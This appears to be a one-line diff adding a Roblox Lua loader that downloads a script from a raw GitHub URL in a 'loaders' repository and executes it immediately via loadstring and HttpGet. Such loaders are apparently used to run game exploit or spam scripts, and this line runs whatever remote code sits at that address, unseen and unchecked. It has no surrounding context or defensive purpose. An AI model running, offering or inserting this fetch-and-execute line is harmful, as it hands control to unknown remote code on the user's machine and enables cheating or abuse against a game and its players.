@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/apple-ipad-original-spam4-f96c3vbhgtjxgz.lua"))()
